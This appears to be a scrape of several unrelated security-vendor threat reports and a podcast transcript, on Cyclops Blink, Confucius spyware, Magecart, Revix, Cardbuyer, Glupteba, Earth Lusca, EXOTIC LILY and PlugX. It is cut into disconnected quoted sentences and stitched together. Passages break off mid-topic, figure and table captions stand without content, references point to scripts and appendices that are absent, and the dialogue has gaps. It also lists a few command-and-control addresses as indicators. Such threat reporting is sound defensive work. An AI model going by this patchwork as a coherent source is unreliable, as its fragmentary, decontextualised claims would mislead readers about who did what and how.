"In the case of Cyclops Blink, we have seen devices that were compromised for over 30 months (about two and a half years) in a row and were being set up as stable C&C servers for other bots."
"The NCSC report covered malware targeting a specific vendor, namely WatchGuard."
"Based on our previous analysis of VPNFilter, we assumed that there were more vendors being attacked by this group."
"The vendors that were targeted by VPNFilter were Asus, D-Link, Huawei, Linksys, MikroTik, Netgear, QNAP, TP-Link, Ubiquiti, UPVEL, and ZDE."
"In the case of Cyclops Blink, we received samples targeting Asus routers that were not previously reported on."
The Asus version of the Cyclops Blink malware that we have analyzed showed some differences compared to the WatchGuard versions that have been previously discussed.
The samples that we have analyzed are compiled for ARM and are dynamically linked against uClibc.
They also contain a module that specifically targets Asus routers.
Asus is likely only one of the vendors that is currently being targeted by Cyclops Blink.
"We have evidence that other routers are affected too, but as of reporting, we were not able to collect Cyclops Blink malware samples for routers other than WatchGuard and Asus."
Looking into the malware and the infrastructure being used by Cyclops Blinks actors gives us some clues about the other vendors that might be affected and how widespread this malware is.
"By sharing this additional technical observation, we aim to help network defenders, as well as those likely to be targeted by APT groups (such as Sandworm), gain a more complete picture of the Cyclops Blink campaign."
"Based on our observation, we strongly believe that there are more targeted devices from other vendors."
This malware is modular in nature and it is likely that each vendor has different modules and architectures that were thought out well by the Cyclops Blink actors.
"Moreover, the purpose of this botnet is still unclear: Whether it is intended to be used for distributed denial-of-service (DDoS) attacks, espionage, or proxy networks remains to be seen."
But what is evident is that Cyclops Blink is an advanced piece of malware that focuses on persistence and the ability to survive domain sinkhole attempts and the takedown of its infrastructure.
The APT group behind this malware has learned from its VPNFilter campaigns and continues to attack IoT devices such as routers.
"In the age of work-from-home (WFH) during the pandemic, it’s possible that espionage is part of the reason that IoT devices are still major targets for advanced attackers."
"The more routers are compromised, the more sources of powerful data collection — and avenues for further attacks — become available to attackers."
Having a distributed infrastructure also makes it more difficult for cybersecurity teams to take down the whole attack.
"This is also why, after more than two years, there are still live VPNFilter hosts out there."
Organizations can protect themselves from Cyclops Blink attacks by using strong passwords and re-examining their security measures.
It is also important to ensure that only the services that absolutely need to be exposed to the internet are exposed.
"Access to these services should be limited, which can be achieved by configuring a virtual private network (VPN) that can access those services remotely."
"It’s also important to set reminders to check if devices such as routers, cameras, network-attached storage (NAS) devices, and other IoT devices have been patched or otherwise."
"If it is suspected that an organization’s devices have been infected with Cyclops Blink, it is best to get a new router."
"Performing a factory reset might blank out an organization’s configuration, but not the underlying operating system that the attackers have modified."
"If a particular vendor has firmware updates that can address a Cyclops Blink attack or any other weakness in the system, organizations should apply these as soon as possible."
"However, in some cases, a device might be an end-of-life product and will no longer receive updates from its vendor."
"In such cases, an average user would not have the ability to fix a Cyclops Blink infection."
"While the Cyclops Blink malware variant that we analyzed in this report is complicated in nature, one thing proves to be unmistakable when it comes to the Sandworm group that created it: Sandworm is a persistent and sophisticated group whose motives are clearly at odds with those that would be expected from groups that are primarily financially motivated."
"Sandworm’s previous high-profile victims and their attacks’ substantial impact on these organizations are particularly worrying — even more so for a group that quickly learns from past errors, comes back stronger time and time again, and for whom international repercussions seem minimal at best."
The indicators of compromise (IOCs) can be found in this appendix and the C&C server validation script can be accessed via this text file.
"Tags APT & Targeted Attacks | IoT | Research | Articles, News, Reports"
The Brazilian Central Bank recently announced that 2017 was the first year in which people did more banking using mobile devices than on PCs.
There were 24.5 billion mobile banking transactions while there were 20.6 billion PC-based transactions.
"But, mobile banking use is picking up around the globe."
What is it?
"As more people move to mobile banking, we believe attackers will focus their attacks away from PC banking and towards mobile banking."
This means the risks of losing control of your accounts through mobile online banking are likely to increase.
And that means the money in your accounts is at risk.
"Why should I care, what can it do to me? Attackers are predictable: they follow people and money."
What can I do about it?
It’s time to take precautions and start good mobile banking security habits.
About Threat Briefs are meant to help busy people understand real-world threats and how they can prevent them in their lives.
"They’re put together by Palo Alto Networks Unit 42 threat research team and are meant for you to read and share with your family, friends, and coworkers so you can all be safer and get on with the business of your digital life. Got a topic you want us to write about for you, your friends, or your family?"
Email us at u42comms@paloaltonetworks.com.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"It’s quite odd (and probably underreported), however, to see it used as a vector for cyberespionage."
"We stumbled upon the Confucius hacking group while delving into Patchwork’s cyberespionage operations, and found a number of similarities."
"Code in their custom malware bore similarities, for instance."
"Confucius targeted a particular set of individuals in South Asian countries, such as military personnel and businessmen, among others."
Are Patchwork and Confucius the same group?
The commands in their backdoors do resemble each other.
"The config files have a similar, custom structure, and both groups have infrastructure overlap."
"However, we construe them to be different groups, possibly within the same community, with different objectives and modi operandi."
"While Patchwork may be more straightforward with its predominantly malware-based attacks, Confucius’ can be inferred to be more nuanced, relying heavily on social engineering."
"Exploiting the human psyche with chat apps Probing Confucius’ infrastructure, we came across websites offering Windows and Android chat applications, most likely iterations of its predecessor, Simple Chat Point: Secret Chat Point, and Tweety Chat."
"We are admittedly uncertain of the extent — and success — of their use, but it’s one of the ingredients of the group’s operations."
"While the chat applications indeed have real chat features (although the communication is not anonymous, as advertised), they have backdoor routines and file-stealing behaviors that get triggered when specific words are sent to the app: collecting and harvesting all SMS messages, contacts, and accounts."
"Tweety Chat’s Android version can record audio, too."
"Its latest version can mute the device (i.e., take out the ringtone and vibration features) and sync call logs and SMSs."
We further tested Tweety Chat and saw red flags indicating their targets of interest: verification emails with a physical address whose postal code is assigned to a provincial capital that also appears (upon logging in) as a chat channel in Tweety Chat.
"Figure 1: Tweety Chat’s interface (top), and code snippets showing the file types it steals (bottom) Romance in cyberespionage"
"The user list, chat room names, and content of the applications were stored in a remote server without any authentication."
The chat logs shed light on the social engineering used by the operators to persuade victims to install the cyberespionage malware on their Android devices.
"The first user and chatroom were created on August 27, 2017, and were probably the app authors’ testing ground."
The succeeding users and chatrooms were created on October 31 and December 12 the latest.
A certain hayat22 and love piqued our interest.
"hayat22, supposedly a female student, engaged in an online romance with a target whose handle was love, describing himself as living in South Asia working in garments manufacturing and wholesaling."
"Over the course of their correspondence, love suggested using WhatsApp to communicate."
"hayat22 declined, saying she felt safer using Tweety Chat."
"love refused, but when hayat22 demurred and gave love an online cold shoulder, love tried installing Tweety Chat — and failed."
He claimed that he wasn’t able to install the app.
hayat22 quickly lost interest and stopped replying to him altogether.
She also sent him a screenshot to show what Tweety Chat looked like.
We’re not sure how love wound up in the chat room or how he met hayat22.
"He was probably either using the Windows version of Secret Chat Point or its web interface, which explains why hayat22 was urging him to install Android Tweety Chat."
"In an earlier chat group, an operator called Heena urged the members to install Secret Chat Point on other people’s mobile devices to get perks like credits or the ability to “go invisible”."
"In another chat room called “Maira’s room”, a target of interest disclosed he was a government officer traveling back from a northern city near the country’s provincial capital."
"A few days after, the operator stopped answering in the chat room, and her user account was deleted from the server."
Figure 2: ByeBye Shell’s interface showing Confucius’ campaigns Figure 3: Screenshot showing a group chat where the moderator is urging users to install Tweety Chat Figure 4: Screenshot showing Tweety Chat promoted in social media
A tangled web of malware
"Confucius’ operations include deploying bespoke backdoors and stealing files from their victim’s systems with tailored file stealers, some of which bore resemblances to Patchwork’s."
The stolen files are then exfiltrated by abusing a cloud storage service.
"Some of these file stealers specifically target files from USB devices, probably to overcome air-gapped environments."
"Compared to Patchwork, whose Trojanized documents exploit at least five security flaws, Confucius’ backdoors are delivered through Office files exploiting memory corruption vulnerabilities CVE-2015-1641 and CVE-2017-11882."
Their malware’s resemblance to that of Patchwork’s is also notable.
The use of an exploit for a security flaw disclosed in December 2017 and their recent activities suggest Confucius is keenly trailing their targets.
"Confucius has a miscellany of backdoors: sctrls, ByeBye Shell, remote-access-c3, and sip_telephone, to name a few."
"One of its file stealers, swissknife2, abuses a cloud storage service as a repository of exfiltrated files."
"At the time of research, there were around 60 victims whose data were uploaded to Confucius-owned cloud storage account."
There were also a few thousand files in the account that were later deleted.
"Our research, Deciphering Confucius: A Look at the Group’s Cyberespionage Operations, delves into the group’s operations, the social engineering methods and gamut of malware it uses, and the countermeasures that organizations can adopt to mitigate them."
"The list of indicators of compromise, which includes Trend Micro’s corresponding detections and solutions, is in this appendix."
Tags Malware | APT & Targeted Attacks | Endpoints | Research |
Mobile
"""A few weeks ago, British Airways was hit by the largest ever regulatory fine of its kind, after global customers visiting its website had their card data stolen."
The $228m penalty levied by the UK’s privacy watchdog reflects the seriousness of the attack and the carrier’s failure to protect its customer’s personal and financial information.
"However, this incident has repercussions way beyond the UK airline and its customers."
"It’s part of a new wave of attacks designed to implant “digital skimming” code on e-commerce sites, in order to siphon off your card details as they are entered in to pay for goods."
"Although tens of thousands of websites have been caught out in this way, there are things you can do to stay safe—most notably by running Trend Micro Security."
"But first, here’s more on what you need to know."
The story so far
"Data breaches are so often in the news headlines today, that you could be forgiven for becoming a little desensitized."
"From retailers like Target and Home Depot to government breaches at agencies including the Office of Personnel Management (OPM), and from financial organizations like Equifax to tech giants like Yahoo, billions of our personal records have been stolen by cyber-thieves over the past few years."
"Yet in all of these cases, there has been little the customer could do about it."
That’s because the hackers target the organization directly.
They find ways to bypass its security controls and sneak inside the company networks to find what they’re looking for: usually databases full of customer data.
A new type of data breach
"However, these new digital skimming attacks are different."
In what way?
They involve a hacker deploying malicious code known as Magecart to an organization’s website.
"This code is typically designed to stay hidden, under the radar of the company."
And it has a very specific purpose: to steal customer card details as they are entered into the site during payment.
"In short, it’s the digital equivalent of those physical skimming devices that criminals insert into ATMs to steal card data as it’s entered: it’s highly effective and happens completely without the knowledge of the cardholder."
"By using this method, the hackers get access to the full card details, which have a higher resale value on the cybercrime black market."
"The problem (for them) with the more traditional types of attack targeting back-end databases, is that these organizations may store card data encrypted, or else minus the crucial CVV/CV2 code."
Magecart attacks get around that.
What sites are at risk?
"Indeed, the Magecart attackers have proven over the past year that no website is safe from skimming attacks."
"Whether it’s a big-name e-commerce brand like Newegg, a national airline, a global ticketing site (Ticketmaster), or even online campus stores serving nearly 200 universities in the US and Canada–as long as they accept online payments, they’re at risk."
"Magecart is so effective that multiple groups are said to be using the code, a piece of malicious JavaScript, to infect websites around the world."
And they’re developing new tools and tactics all the time to improve their monetization.
"These include: Infecting third-party companies which supply code to other sites (e.g., those that provide online ad services)."
"Thus, with just one attack, the hackers can get their Magecart code onto potentially thousands of payment pages."
"Using automated tools to scan the internet for companies that may be running unsecured servers, which they can then infect with Magecart."
"Some 17,000 sites were recently compromised in this way."
"In a separate attack, 962 online stores were hit in just 24 hours."
Developing new skimming code which is usable across as many different payment pages as possible.
"The record is 57 different payment gateways, which makes the hackers’ job much easier as they can launch attack campaigns across the globe with the same tools All this is bad news for online shoppers."
So how do you know that the site you’re entering card data into is safe?
What can you do to stay safe?
"Unfortunately, there’s nothing obvious that differentiates a website infected with Magecart from any other site."
It will look completely normal and will allow you to pay in the usual manner.
"The only difference is that, in the background, a tiny piece of code will be stealing your data and transferring it to the hackers."
So what can you do to protect yourself?
You could try to avoid smaller sites that may not have the same level of security as larger ones.
"However, as we’ve seen, Magecart has hit big-name brands as well as less well-known companies."
Another option would be to use a browser plug-in like NoScript for Firefox that prevents JavaScript loading from other untrusted sites – although this won’t prevent you getting potentially stung if the well-known and trusted site you’re on is compromised
Payment systems like Apple Pay and Google Pay can offer more protection.
"They use a one-time generated series of numbers for each transaction, so that if attackers get their hands on it, they won’t be able to use it in the future."
It goes without saying that you should keep a close eye on your card statements/bank account at all times – watching out even for small amounts that hackers may be making to test if your card is still active.
"However, the most effective way to stay safe is to use Trend Micro Security."
How Trend Micro can help Trend Micro Security features two key mechanisms to help stop Magecart attacks:
"It can detect whether the website you want to visit has been injected with skimming code, and block you from visiting the URL (via web reputation), as well as from going to malicious domains the skimming code has access to."
Cyber Crime | Expert Perspective | Cyber Threats
REvil
"While the disappearance of REvil (aka Sodinokibi) in mid-2021 is filled with uncertainty, security researchers have found a Linux version of the REvil ransomware that they have dubbed as Revix."
"After analyzing the samples, we found four different versions of the malware, all of which rely on an embedded JavaScript Observed Notation (JSON)-based configuration to set parameters before encrypting files."
Figure 1. Revix’s JSON-based configuration
Figure 2. Revix encrypting a QNAP NAS device Figure 3.
Revix
StealthWorker
StealthWorker
Figure 5. Infected Linux device connected to a C&C server
How to protect NAS devices
Here are some best practices to protect your systems against threats that leverage the gaps in your NAS devices:
Avoid connecting a NAS device directly to the internet.
Regularly change the credentials for accessing an NAS device.
"On April 21st our WildFire analysis cloud detected a new Android Trojan, which is currently completely undetected in VirusTotal and uses a new combination of tactics to make money for the author."
"Code analysis shows that this malware sample can defeat the existing multi-factor verification procedures of many popular game platforms or online payment systems, and impersonate the smartphone user in making the purchase."
The name is看片神器 which translates to “a super tool for watching videos” and the icon is a provocative photo.
"Once launched, it contacts a command and control server hosted in China using an HTTP GET request to the following website to register the infection with the attacker: http://14.17.95.205:21910/my/service.php."
Figure 1.
UUDama uses a combination of machines and humans to quickly take CAPTCHA images submitted by Cardbuyer (or anyone else who will pay) and turn them into the expected text within 60 seconds.
"To avoid having this request rejected by the server, the Trojan alters its user-agent string to appear as Internet Explorer 9 running on Windows 7."
Figure 4.
Figure 5.
Figure 6.
The complicated user verification procedure continues.
"In Figure 8, we show the patterns for different types of SMS contents."
"From here the attacker can sell the code to someone else for cash, or redeem it directly. While in the example here Cardbuyer targeted the Tianxiafu service, all of the services listed above are targets already pre-defined in its source code."
Any service that uses SMS for authentication of information or proof that a user is authorizing a charge is vulnerable to Trojan attacks.
"Join us Wednesday, April 30 at 3 p.m. EDT, for a new webinar, “Need to Defeat APTs?"
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 2022.
"It was last updated on May 12, 2022."
We have also taken extraordinary measures beyond our actions against coordinated influence operations to protect users and stop the spread of misinformation and disinformation about the war in Ukraine online.
We use our research to continuously improve the safety and security of our products and share this intelligence with the community to benefit the internet as a whole.
"As announced today, Google has taken action to disrupt the operations of Glupteba, a multi-component botnet targeting Windows computers."
The Glupteba malware family is primarily distributed through pay per install (PPI) networks and via traffic purchased from traffic distribution systems (TDS).
"For a period of time, we observed thousands of instances of malicious Glupteba downloads per day."
The following image shows a webpage mimicking a software crack download which delivers a variant of Glupteba to users instead of the promised software.
"While analyzing Glupteba binaries, our team identified a few containing a git repository URL: “git.voltronwork.com”."
"This finding sparked an investigation that led us to identify, with high confidence, multiple online services offered by the individuals operating the Glupteba botnet."
"This past year, TAG has been collaborating with Google’s CyberCrime Investigation Group to disrupt Glupteba activity involving Google services."
"Parallel to the analysis, tracking, and technical disruption of this botnet, Google has filed a lawsuit against two individuals believed to be located in Russia for operating the Glupteba Botnet and its various criminal schemes."
"To add resilience to their infrastructure, the operators have also implemented a backup mechanism using the Bitcoin blockchain."
"Full details of Glupteba’s network protocol can be found in this report from 2020, the following Python script illustrates how one can decrypt an encrypted domain name:"
"Since mid-2021, we have been investigating a rather elusive threat actor called Earth Lusca that targets organizations globally via a campaign that uses traditional social engineering techniques such as spear phishing and watering holes."
"Previous research into the group’s activities attributed it to other threat actors such as the Winnti group due to the use of malware such as Winnti, but despite some similarities, we consider Earth Lusca a separate threat actor (we do have evidence, however, that the group is part of the “Winnti cluster,” which is comprised of different groups with the same origin country and share aspects of their TTPs)."
"The first cluster is built using virtual private servers (VPS), rented from a service provider, that are used for the group’s watering hole and spear phishing operations, in addition to acting as a command-and-control (C&C) server for malware."
"The second cluster is made up of compromised servers running old, open-source versions of Oracle GlassFish Server."
Figure 1.
An overview of Earth Lusca’s infrastructure Social Engineering and Vulnerability Exploitation techniques
"The group has three primary attack vectors, two of which involve social engineering."
The social engineering techniques can be broken down into spear phishing emails and watering hole websites.
Our telemetry data shows Earth Lusca sending spear phishing emails containing malicious links to one of their targets — a media company.
The user eventually downloads an archive file containing either a malicious LNK file or an executable — eventually leading to a Cobalt Strike loader.
"In addition to spear phishing emails, Earth Lusca also made use of watering hole websites — they either compromised websites of their targets or set up fake web pages copied from legitimate websites and then injected malicious JavaScript code inside them."
This script was designed to show a social engineering message — typically a Flash update popup or a DNS error (note that Adobe discontinued Flash Player at the end of December 2020) that then instructed the visitor to download a malicious file that turned out to be a Cobalt Strike loader.
Figure 2. Fake installation pop-up The third attack vector used by Earth Lusca is the exploitation of vulnerabilities that exist in the public-facing applications — such as Microsoft Exchange ProxyShell and Oracle GlassFish — of its targets.
"Once these are accomplished, Earth Lusca is free to perform its post-exploitation routines that include installation of tools such as Cobalt Strike and Acunetix (we discuss the post-exploitation routines in detail in the technical brief)."
Malware used by Earth Lusca Earth Lusca employs several malware and other hacking tools in its arsenal.
This post is also available in: 日本語 (Japanese) Unit 42 released details about a new spear phishing campaign called FreeMilk that uses a relatively new attack technique that can be highly effective.
"Phishing attacks are broad, leveraging email messages crafted around common, generalized topics in order to trick recipients into opening an email message and its attachments."
"Attackers will cast a wide net, with no regard to who the victims are, hoping that a decent percentage of attacks are successful."
"Spear phishing, like the name implies, is a more targeted form of phishing which incorporates a theme directly related to the target."
"FreeMilk is an advanced spear phishing attack campaign that, instead of using a theme to lure targets into downloading a malicious attachment, hijacks an in-progress email conversation."
"Simply explained: Figure 1 Conversation Hijacking to Deliver Malware Unit 42 observed this specific attack taking advantage of a vulnerability in Microsoft Office, which has a patch available."
"Also, read about a data breach from IoT company Wyze that exposed information of 2.4 million customers."
Read on:
Cambridge Analytica Scandal: Facebook Hit with $1.6 Million Fine
The Cambridge Analytica scandal continues to haunt Facebook.
Why Running a Privileged Container in Docker is a Bad Idea
"IoT Company Wyze Leaks Emails, Device Data of 2.4M"
"The new research expands on previous work into an attack vector known as Rowhammer, first detailed in 2014 Emotet Attack Causes Shutdown of Frankfurt’s IT Network"
"The city of Frankfurt, Germany, became the latest victim of Emotet after an infection forced it to close its IT network."
"Greg Young, vice president of cybersecurity at Trend Micro, discusses BeyondProd’s value in this article."
How MITRE ATT&CK Assists in Threat Investigation
"In this analysis, Trend Micro investigates an incident involving the MyKings botnet to show how the MITRE ATT&CK framework helps with threat investigation."
Share your thoughts in the comments below or follow me on Twitter to continue the conversation: @JonLClay.
"Jon Clay, VP of Threat Intelligence: [00:00:00"
Joining me again is my cohort in crime.
"Ed Cabrera, Chief Cybersecurity Officer:"
My name's Ed Cabrera.
I'm the Chief Cybersecurity Officer at Trend Micro.
It’s great to be here.
Jon:
"But we didn't cover a number of areas that I thought we were going to cover, but we didn't."
"So I thought you and I [00:01:00] could take time today and talk a little bit about cyber warfare, hybrid warfare."
Any initial thoughts around this?
Maybe explain to the audience what hybrid warfare or cyber warfare is.
Ed:
"Well, yeah, absolutely."
"And so, when we talk about in terms of cyber conflict, cyber war, it has usually been in the context of just [00:02:00] another element within that 360-degree dominance that they hope to achieve in any conflict of war."
"Cyber is that one space such as air dominance, for example, right?"
"And cyberspace is just one of them now, but we're getting into this unique area which we anticipated…could cyber conflict be the main domain that is being acted upon?"
"We'll talk about it [00:03:00] here now, but I think when we talk in terms for, especially for here is like cyber conflict, cyber war, or hybrid, and the hybrid piece is just a definition of kinetic and cyber."
Jon:
Right.
And you just have computers fighting it out.
Ed:
"No, absolutely."
So cyber is still critical as we become more hyper-connected.
"As we approach ubiquitous computing, ubiquitous connectivity, cyber then becomes very relevant."
"But as we’ve seen, it's an interesting concept because traditionally cyber has just been more of an information gathering or cyber espionage tool to aid any type of conflict."
Jon:
Ed:
"Well, I mean, it still serves a purpose if you're able to knock down the power or communication, the real two top tier critical infrastructure."
"That's one of the first areas on either side they're looking to obtain dominance, is to knock out the command and control."
Jon:
Ed:
"Oh, absolutely."
It's nothing new.
"Information warfare, PSYOPs, psychology operations - you name it."
Jon:
We don't need to [00:07:00] drop the pamphlets out of the plane anymore.
Ed: Exactly.
"You don't need to – everybody's got a phone, right?"
"So, you're able to instantaneously provide some type of propaganda or misinformation around the globe."
Jon:
They could have done a deep fake of Zelensky talking about something that could have caused panic inside the country.
Think about something like that happening.
That's what you're probably going to see in the future as well.
One other area that we didn't talk about that I thought was pretty interesting was around cyber mercenaries.
They’re regular citizens.
Ed:
"Yeah, well, again, everything that we see in cyberspace is a direct analogy on the physical side."
"Such as the term mercenary, right?"
This just makes it unique.
"They could be patriotic hackers, they could just be guns for hire or cyber guns for hire, so to speak."
Are they really just uniform soldiers behind keyboards?
So [00:10:00] it's an interesting thing that nobody really likes to talk about it.
Jon:
"When you think as nation state, what should a nation state be looking at for the future?"
Ed:
"Yeah, sure, absolutely."
"Just like on the physical or kinetic side, we need to be very cognizant of our critical infrastructure."
But we really need to understand what is critical.
"Obviously, this is where our focus needs to be, hands down."
"These are the things that I think countries across the globe need to understand, especially here in Western countries, and especially NATO countries, understanding that they need to be shoring up, and almost like DHS says in their program, Shields Up, is really focused on being proactive and protecting those critical sectors."
Jon:
"Because again, that's where we're going to get our information if a conflict does come up."
"Ed, this has been a great discussion."
Ed:
Jon:
"Well, everybody, thanks for joining us again."
On episode four of #TrendTalksBizSec.
"So, take care, have a great day."
Thanks Ed.
Have a good day.
[00:14:00] Additional Resources:
Link to Jon’s panel discussion in Davos: https://www.youtube.com/watch?v=GAZng8u9FXk
"Ed’s social media: @Ed_E_Cabrera (Twitter), https://www.linkedin.com/in/ed-e-cabrera/ (LinkedIn)"
"To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild."
"If the link was not active, the user was redirected directly to a legitimate website."
"We assess that these campaigns delivered ALIEN, a simple Android malware in charge of loading PREDATOR, an Android implant described by CitizenLab in December 2021."
ALIEN lives inside multiple privileged processes and receives commands from PREDATOR over IPC.
"We did not capture the subsequent stages, but assess the attackers did not have exploits for the current version of Chrome (91.0.4472) at that time, but instead used n-day exploits targeting Samsung Browser, which was running an older and vulnerable version of Chromium."
Related IOCs
"We recovered the exploit used to escape the Chrome Sandbox, but not the initial RCE exploit."
We haven’t retrieved a copy of the exploit.
Related IOCs
Related IOCs
We would also like to thank Project Zero for their technical assistance in helping analyze these bugs.
We remain committed to updating the community as we uncover these campaigns.
We look forward to continuing our work in this space and advancing the safety and security of our users around the world.
"NOTE: On May 20th, we updated our attribution to more precisely describe our findings."
"Since our last update, TAG has observed a continuously growing number of threat actors using the war as a lure in phishing and malware campaigns."
"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin."
The data is then exfiltrated via email to a compromised email account.
Malware samples:
TAG would like to thank the Yahoo! Paranoids Advanced Cyber Threats Team for their collaboration in this investigation.
"Recently observed Turla domains: COLDRIVER, a Russian-based threat actor sometimes referred to as Callisto, continues to use Gmail accounts to send credential phishing emails to a variety of Google and non-Google accounts."
"The group's tactics, techniques and procedures (TTPs) for these campaigns have shifted slightly from including phishing links directly in the email, to also linking to PDFs and/or DOCs hosted on Google Drive and Microsoft One Drive."
Within these files is a link to an attacker controlled phishing domain.
These phishing domains have been blocked through Google Safe Browsing – a service that identifies unsafe websites across the web and notifies users and website owners of potential harm.
"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, has remained active during the course of the war and recently resumed targeting of Gmail accounts via credential phishing."
"This campaign, targeting high risk individuals in Ukraine, contained links leading to compromised websites where the first stage phishing page was hosted."
"If the user clicked continue, they would be redirected to an attacker controlled site that collected the users credentials."
"In mid-April, TAG detected a Ghostwriter credential phishing campaign targeting Facebook users."
"Recently observed Ghostwriter credential phishing domains and emails: Curious Gorge, a group TAG attributes to China's PLA SSF, has remained active against government, military, logistics and manufacturing organizations in Ukraine, Russia and Central Asia."
"Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further exploitation."
"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information."
"While we are actively monitoring activity related to Ukraine and Russia, we continue to be just as vigilant in relation to other threat actors globally, to ensure that they do not take advantage of everyone’s focus on this region."
"Since our last update, TAG has observed a continuously growing number of threat actors using the war as a lure in phishing and malware campaigns."
TAG has also continued to observe multiple ransomware brokers continuing to operate in a business as usual sense.
"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin."
"Recently observed IPs used in Curious Gorge campaigns: COLDRIVER, a Russian-based threat actor sometimes referred to as Calisto, has launched credential phishing campaigns, targeting several US based NGOs and think tanks, the military of a Balkans country, and a Ukraine based defense contractor."
We have not observed any Gmail accounts successfully compromised during these campaigns.
"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, recently introduced a new capability into their credential phishing campaigns."
"In mid-March, a security researcher released a blog post detailing a 'Browser in the Browser' phishing technique."
"While TAG has previously observed this technique being used by multiple government-backed actors, the media picked up on this blog post, publishing several stories highlighting this phishing capability."
"Ghostwriter actors have quickly adopted this new technique, combining it with a previously observed technique, hosting credential phishing landing pages on compromised sites."
"The new technique, displayed below, draws a login page that appears to be on the passport.i.ua domain, overtop of the page hosted on the compromised site."
Recently observed Ghostwriter credential phishing domains:
"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information."
"While we are actively monitoring activity related to Ukraine and Russia, we continue to be just as vigilant in relation to other threat actors globally, to ensure that they do not take advantage of everyone’s focus on this region."
"The exploit was patched on February 14, 2022."
"The earliest evidence we have of this exploit kit being actively deployed is January 4, 2022."
Victims who clicked on the links would be served a hidden iframe that would trigger the exploit kit.
Attacker-Owned Websites: Compromised Websites (Feb 7 - Feb 9): Exploitation URLs:
"The attackers placed links to the exploit kit within hidden iframes, which they embedded on both websites they owned as well as some websites they compromised."
"If the RCE was successful, the javascript would request the next stage referenced within the script as “SBX”, a common acronym for Sandbox Escape."
We unfortunately were unable to recover any of the stages that followed the initial RCE.
We did not recover any responses from those URLs.
Example Exploit Kit:
"As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products."
We hope that improved understanding of the tactics and techniques will enhance threat hunting capability and lead to stronger user protections across industry.
"In early September 2021, Threat Analysis Group (TAG) observed a financially motivated threat actor we refer to as EXOTIC LILY, exploiting a 0day in Microsoft MSHTML (CVE-2021-40444)."
"Investigating this group's activity, we determined they are an Initial Access Broker (IAB) who appear to be working with the Russian cyber crime gang known as FIN12 (Mandiant, FireEye) / WIZARD SPIDER (CrowdStrike)."
"EXOTIC LILY is a resourceful, financially motivated group whose activities appear to be closely linked with data exfiltration and deployment of human-operated ransomware such as Conti and Diavol."
"Additionally and rather uniquely, they leverage legitimate file-sharing services like WeTransfer, TransferNow and OneDrive to deliver the payload, further evading detection mechanisms."
This level of human-interaction is rather unusual for cyber crime groups focused on mass scale operations.
EXOTIC LILY’s attack chain has remained relatively consistent throughout the time we’ve been tracking the group: One notable technique is the use of domain and identity spoofing as a way of gaining additional credibility with a targeted organization.
"Using spoofed email accounts, attackers would then send spear phishing emails under the pretext of a business proposal, such as seeking to outsource a software development project or an information security service."
Distribution of the actor’s working hours suggest they might be working from a Central or an Eastern Europe timezone.
These samples have some indicators that suggest they were custom-built to be used by the group.
The loader can be recognized by its use of a unique user-agent “bumblebee” which both variants share.
"The malware, hence dubbed BUMBLEBEE, uses WMI to collect various system details such as OS version, user name and domain name, which are then exfiltrated in JSON format to a C2."
"At the time of the analysis, BUMBLEBEE was observed to fetch Cobalt Strike payloads."
EXOTIC LILY activities overlap with a group tracked as DEV-0413 (Microsoft) and were also described by Abnormal in their recent post.
"We believe the shift to deliver BazarLoader, along with some other indicators such as a unique Cobalt Strike profile (described by RiskIQ) further confirms the existence of a relationship between EXOTIC LILY and actions of a Russian cyber crime group tracked as WIZARD SPIDER (CrowdStrike), FIN12 (Mandiant, FireEye) and DEV-0193 (Microsoft)."
"As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products."
Recent domains used in email campaigns: BazarLoader ISO samples: Recent BUMBLEBEE ISO samples: Recent BUMBLEBEE C2:
"Recently, FireEye published a blog titled “Operation Poisoned Hurricane” which detailed the use of PlugX malware variants signed with legitimate certificates that used Google Code project pages for command and control (C2)."
We were able to uncover multiple additional samples exploiting the same technique as well as an additional Google Code account with multiple projects containing encoded commands.
"The attacks against Palo Alto Networks customers, which took place between early June to early July, also targeted users in East Asia; in this case an international law firm’s regional office and a major university."
All of the attacks were detected by our WildFire platform.
"Of note, three of the Google Code projects associated with the newly uncovered account were added during the past few days, indicating it is still in active use. Below is a current screenshot of the newly uncovered Google Code account’s projects."
The encoded commands decode to the below IP addresses.
"Interestingly, “/p/pthon”, which is the project page used by some of the newly discovered samples detailed later in this blog, is the only page with the encoded command not included in the summary and is instead in text only on the page itself."
"Table 1 We discovered a total of seven samples, five of which were not in VirusTotal prior to our submission."
"Table 2 contains details of a PlugX sample using the PixelPlus Co., Ltd certificate that is currently only detected by four AV vendors."
"Interestingly, the IP resolved by the initial website hosting the PlugX malware also served as a C2 server for different malware in mid-December 2013 (MD5: ddd46ce5e5eaaa8e61ce11a121a79266)."
Table 2
"The PlugX sample in Table 3 also uses the legitimate PixelPlus Co., Ltd certificate and was also targeted against the university."
It is correctly identified by eleven AV vendors as PlugX malware.
The registrant information associated with the website hosting the malware is a domain reseller.
Table 3
We were able to uncover an additional two samples using the QTI International Inc certificate and Google Code pages.
Only three AV vendors correctly identified it as PlugX malware.
Table 4 The second sample using the QTI International Inc certificate also uses IP 211.233.89.182 for C2 but does not first connect to a Google Code page and is not PlugX.
"Of note, the PlugX sample in Table 8 uses a different certificate but was downloaded from the same website."
"It also uses the Google Code page “/p/tempzz” for C2, which was also listed in FireEye’s blog."
"The website hosting the malware was registered 4 June 2014 via eNom, a well-known domain name registrar."
Table 5
"Our team was able to further uncover three new samples using the Ssanyong Motor Co., Ltd certificate and Google Code C2 redirection."
"The PlugX sample in Table 4 used the same Google Code page and redirect, but the QTI International Inc certificate."
The below PlugX sample was only detected as PlugX malware by two AV vendors.
Table 6
The PlugX sample in Table 7 also targeted the same university as all previous samples.
Eight AV vendors correctly identified it.
Table 7
